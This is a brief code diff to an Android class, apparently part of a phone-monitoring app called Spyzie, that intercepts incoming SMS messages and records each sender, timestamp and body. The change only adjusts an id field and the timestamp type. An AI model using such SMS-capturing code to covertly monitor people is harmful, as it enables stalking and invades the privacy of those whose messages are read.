@@ -21,8 +21,9 @@ public class SpyzieReceiver extends BroadcastReceiver {
         for (int i = 0; i < pdus.length; i++) {
             smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
             if (i == 0) {
+                sms.id = -1;
                 sms.address = smsMessage.getDisplayOriginatingAddress();
-                sms.time = String.valueOf(smsMessage.getTimestampMillis());
+                sms.time = smsMessage.getTimestampMillis();
             }
             smsBody.append(smsMessage.getMessageBody());
         }
